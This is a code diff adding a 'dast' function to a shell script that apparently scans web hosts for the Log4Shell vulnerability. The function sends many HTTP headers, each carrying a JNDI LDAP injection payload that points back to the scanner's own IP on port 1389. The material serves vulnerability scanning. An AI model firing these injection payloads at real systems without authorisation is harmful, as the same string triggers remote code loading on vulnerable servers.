@@ -78,6 +78,26 @@ function clean(){
   rm -fr reports
 }
 
+# dast scan 
+function dast() {
+  host=$1
+  [ ! -z $host ] || raise_error "Host parameter Missing"
+  host_ip="$(ifconfig | grep "inet " | grep -Fv 127.0.0.1 | awk '{print $2}')"
+  headers=$(curl -s "https://raw.githubusercontent.com/rajasoun/log4j-scanners/main/dast/headers-large.txt")
+  echo "$headers" | while IFS= read -r header 
+  do
+    echo -e "Injection Check with $header"
+    malicious_packet="$header: \${jndi:ldap://$host_ip:1389/o=reference}"
+    response=$(curl  -s -H "$malicious_packet" "$host")
+    response_check=$(echo $response | awk '{print $3}')
+    [ -z $response_check ] && continue
+    if [  $response_check = "\${jndi:ldap://$host_ip:1389/o=reference}" ]; then 
+      echo -e "${BOLD}${RED}\nVulnerable for header ->${NC} $header\n"
+    fi 
+  done 
+  IFS=$OLDIFS
+}
+
 # help 
 function help(){
   echo -e "${RED}Usage: $0  { sbom-scan | sast } ${NC}" >&2
@@ -96,7 +116,7 @@ function main(){
   case $choice in
     sast) sast  "$@" ;;
     sbom-scan) sbom_scan  "$@" ;;
-    dast) dast/dast.sh "$@" ;;
+    dast) dast "$@" ;;
     *)  help ;;
   esac
 }
